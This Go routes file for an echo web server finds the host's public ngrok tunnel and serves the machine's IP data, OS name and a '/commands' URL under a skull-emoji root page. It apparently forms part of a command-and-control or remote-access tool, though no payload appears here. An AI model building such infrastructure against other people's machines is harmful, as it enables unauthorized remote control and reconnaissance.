package routes

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"runtime"

	"github.com/labstack/echo"
)

func Get(e *echo.Echo) {
	resp, err := http.Get("http://ip-api.com/json")
	if err != nil {
		log.Fatalln(err)
	}
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Fatalln(err)
	}
	sb := string(body)
	res, err := http.Get("http://127.0.0.1:4040/api/tunnels")
	if err != nil {
		fmt.Println(err)
		return
	}
	body1, err1 := ioutil.ReadAll(res.Body)
	if err1 != nil {
		fmt.Println(err1)
		return
	}
	urlNgrok := DetectNgrok.FindString(string(body1))
	commands := urlNgrok + "/commands"
	ip := urlNgrok + "/ip"
	os := urlNgrok + "/ip/os"
	type allUrl []url
	var urls = allUrl{
		{
			Url:   commands,
			Urlos: os,
			Urlip: ip,
		},
	}
	e.GET("/", func(c echo.Context) error {
		c.String(http.StatusOK, "💀")
		return nil
	})
	e.GET("/ngrok", func(c echo.Context) error {
		c.Response().Header().Set("Content-Type", "application/json")
		json.NewEncoder(c.Response()).Encode(urls)
		return nil
	})
	e.GET("/ip", func(c echo.Context) error {
		c.String(http.StatusOK, sb)
		return nil
	})
	e.GET("/ip/os", func(c echo.Context) error {
		c.String(http.StatusOK, runtime.GOOS)
		return nil
	})
}
